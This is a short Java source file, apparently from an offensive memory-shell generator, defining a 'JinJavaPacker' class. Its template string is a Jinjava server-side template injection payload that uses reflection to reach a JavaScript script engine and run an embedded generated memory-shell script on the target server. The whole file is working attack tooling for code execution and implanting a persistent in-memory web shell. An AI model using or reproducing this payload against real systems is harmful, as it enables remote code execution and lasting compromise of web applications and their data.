package com.reajason.javaweb.memshell.packer.jinjava;

import com.reajason.javaweb.memshell.Packers;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

/**
 * @author ReaJason
 * @since 2025/1/30
 */
public class JinJavaPacker implements Packer {
    String template = "{{ ''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(''.getClass().forName('java.io.StringReader').getConstructors()[0].newInstance('{{script}}')) }}";

    @Override
    public String pack(GenerateResult generateResult) {
        String script = Packers.ScriptEngine.getInstance().pack(generateResult);
        return template.replace("{{script}}", script);
    }
}
